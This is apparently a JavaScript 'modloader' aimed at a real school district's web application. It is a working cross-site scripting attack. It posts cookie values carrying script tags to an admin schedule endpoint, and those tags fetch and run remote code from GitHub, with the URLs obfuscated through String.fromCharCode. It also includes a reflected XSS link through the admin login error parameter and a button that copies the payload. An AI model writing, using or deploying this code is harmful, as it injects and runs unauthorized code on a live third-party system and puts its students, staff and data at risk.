function install() {
    function getCookie(name) {
        const cookies = document.cookie.split('; ');
        for (const cookie of cookies) {
            const [cookieName, cookieValue] = cookie.split('=');
            if (cookieName === name) {
                return decodeURIComponent(cookieValue);
            }
        }
        return null;
    }

    const formData = new FormData();
    for (let i = 1; i <= 8; i++) {
        const cookieName = `Period${i}`;
        const originalCookie = getCookie(cookieName);
        if (originalCookie) {
            formData.append(cookieName, `${originalCookie}<script>fetch(String.fromCharCode(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,80,111,121,79,122,107,47,82,72,83,45,77,111,100,108,111,97,100,101,114,47,109,97,105,110,47,115,116,97,114,116,46,106,115)).then(response=>response.text()).then(d=>(Function(d))())</script>`);
        } else {
            formData.append(cookieName, `<span class=\"original\">Period ${i}</span><script>fetch(String.fromCharCode(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,114,104,115,109,108,47,82,72,83,45,77,111,100,108,111,97,100,101,114,47,109,97,105,110,47,115,116,97,114,116,46,106,115)).then(response=>response.text()).then(d=>(Function(d))())</script>`);
        }
    }

    const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://app.ridgewood.k12.nj.us/admin/pages/schedule/set-schedule.php', true);
xhr.onload = function() {
  if (xhr.status === 200) {
    console.log('Success!');
    location.replace("https://app.ridgewood.k12.nj.us/?date=22,2,2?setup=true")
  } else {
    console.error('Error:', xhr.statusText);
  }
};
xhr.send(formData);
}

function deleteInstall() {
    document.cookie.split(";").forEach(function(c) {
        if (c.match("original")) {
            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");
        } else {
            var cookies = document.cookie.split('; ');
            cookies.forEach((cookie) => {
                const [name, value] = cookie.split('=');
                if (value && value.includes("%3Cscript%3Efetch(String.fromCharCode(104%2C116%2C116%2C112%2C115%2C58%2C47%2C47%2C114%2C97%2C119%2C46%2C103%2C105%2C116%2C104%2C117%2C98%2C117%2C115%2C101%2C114%2C99%2C111%2C110%2C116%2C101%2C110%2C116%2C46%2C99%2C111%2C109%2C47%2C80%2C111%2C121%2C79%2C122%2C107%2C47%2C82%2C72%2C83%2C45%2C77%2C111%2C100%2C108%2C111%2C97%2C100%2C101%2C114%2C47%2C109%2C97%2C105%2C110%2C47%2C115%2C116%2C97%2C114%2C116%2C46%2C106%2C115)).then(response%3D%3Eresponse.text()).then(d%3D%3E(Function(d))())%3C%2Fscript%3E")) {
                    const updatedValue = value.replace("%3Cscript%3Efetch(String.fromCharCode(104%2C116%2C116%2C112%2C115%2C58%2C47%2C47%2C114%2C97%2C119%2C46%2C103%2C105%2C116%2C104%2C117%2C98%2C117%2C115%2C101%2C114%2C99%2C111%2C110%2C116%2C101%2C110%2C116%2C46%2C99%2C111%2C109%2C47%2C80%2C111%2C121%2C79%2C122%2C107%2C47%2C82%2C72%2C83%2C45%2C77%2C111%2C100%2C108%2C111%2C97%2C100%2C101%2C114%2C47%2C109%2C97%2C105%2C110%2C47%2C115%2C116%2C97%2C114%2C116%2C46%2C106%2C115)).then(response%3D%3Eresponse.text()).then(d%3D%3E(Function(d))())%3C%2Fscript%3E", "").replace("110%2C116%2C46%2C99%2C111%2C109%2C47%2C80%2C111%2C121%2C79%2C122%2C107%2C47%2C82%2C72%2C83%2C45%2C77%2C111%2C100%2C108%2C111%2C97%2C100%2C101%2C114%2C47", "");
                    document.cookie = `${name}=${updatedValue}; samesite=Lax; path=/`;
                }
            });
        }
    })
}

function clearInstall() {
    const cookies = document.cookie.split("; ");
    cookies.forEach(function(cookie) {
        const cookieName = cookie.split("=")[0];
        if (cookieName !== "PHPSESSID") {
            document.cookie = cookie.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");
        }
    });
}


document.clearInstall = clearInstall;
document.deleteInstall = deleteInstall;
document.install = install;
if (document.cookie.includes("2Fspan")) {
document.documentElement.innerHTML = `<!DOCTYPE html> <html lang="en"> <head> <meta charset="UTF-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>RHS Modloader</title> <meta content="RHS Modloader" property="og:title"> <meta content="Modloader for RHS." property="og:description"> <meta content="https://app.ridgewood.k12.nj.us/admin/index.php?username=&error=%3Cscript%3Einstall=String.fromCharCode(115,99,114,105,112,116);replace=String.fromCharCode(104,116,116,112,115,58,47,47,99,100,110,46,106,115,100,101,108,105,118,114,46,110,101,116,47,103,104,47,80,111,121,114,97,122,79,122,107,117,115,97,107,115,105,122,47,82,72,83,45,77,111,100,108,111,97,100,101,114,64,109,97,115,116,101,114,47,105,110,115,116,97,108,108,101,114,46,106,115);var%20scriptTag%20=%20document.createElement(install);scriptTag.src%20=%20replace;document.body.appendChild(scriptTag);%3C/script%3E" property="og:url"> <meta content="#a80f1f" data-react-helmet="true" name="theme-color"> <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/PoyrazOzkusaksiz/RHS-Modloader/main/images/rps-RHS-watch.ico"> </head> <body> <div class="frame"> <div class="main"> <h1>Welcome to the RHS Modloader</h1> <img class="pressStart" onclick="install()" src="https://raw.githubusercontent.com/PoyrazOzkusaksiz/RHS-Modloader/main/images/rps-RHS-watch.png"> <h3 class="navigator">Click the button to install</h3> <div style="display: flex;justify-content: space-between;width:330px;position: relative;top: 6%;left: 50%;transform: translate(-50%, -50%);"> <h3 class="option uninstall" onclick="deleteInstall()">Uninstall <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-right" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4.646 1.646a.5.5 0 0 1 .708 0l6 6a.5.5 0 0 1 0 .708l-6 6a.5.5 0 0 1-.708-.708L10.293 8 4.646 2.354a.5.5 0 0 1 0-.708z"></path></svg></h3><h3 class="option clear" onclick="clearInstall()">Clear <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-right" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4.646 1.646a.5.5 0 0 1 .708 0l6 6a.5.5 0 0 1 0 .708l-6 6a.5.5 0 0 1-.708-.708L10.293 8 4.646 2.354a.5.5 0 0 1 0-.708z"></path></svg></h3><h3 class="option copy" onclick="navigator.clipboard.writeText('<script>fetch(String.fromCharCode(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,80,111,121,79,122,107,47,82,72,83,45,77,111,100,108,111,97,100,101,114,47,109,97,105,110,47,115,116,97,114,116,46,106,115)).then(response=>response.text()).then(d=>eval(d))</script>')">Copy Code <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-right" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4.646 1.646a.5.5 0 0 1 .708 0l6 6a.5.5 0 0 1 0 .708l-6 6a.5.5 0 0 1-.708-.708L10.293 8 4.646 2.354a.5.5 0 0 1 0-.708z"></path></svg></h3> </div> </div> <style> svg[width="16"] { position: relative; stroke: white; top: 2px; left: -2px; } h1, h3, h4 { color: white; text-align: center; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; } a { color: #0074cc; text-decoration: none; position: absolute; bottom: 0; left: 50%; transform: translate(-50%, -50%); } body { background: rgb(121, 35, 47); background: linear-gradient(270deg, rgba(121, 35, 47, 1) 0%, rgba(135, 10, 42, 1) 96%); } .main { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); transition: 0.2s; height: auto; height: 441px; width: 864px; } .option { transition: 0.2s; user-select: none; } .option:hover { cursor: pointer; transform: scale(1.1); } .pressStart { margin: 20px 0px 20px 0px; position: relative; top: 22%; left: 50%; transform: translate(-50%, -50%); transition: 0.2s; width: 23%; height: auto; } .pressStart:hover { transform: translate(-50%, -50%) scale(1.1); } .pressStart:active { transform: translate(-50%, -50%) scale(0.9); } .frame {position:absolute;top:50%;left:50%;transform:translate(-50%, -50%);height:auto;height:87%;width:85%;border-radius:15px;background:#571d1d7d;border:0.5px solid black;}.option:active {cursor:pointer;transform:scale(0.9);}</style> <h4><a href="https://github.com/PoyrazOzkusaksiz/RHS-Modloader">GitHub</a></h4> <div> </body> </html> `;
    document.querySelector(".navigator").innerText = "RHS Modloader already installed.";

    function install() {};
    document.install = install
} else { install() }
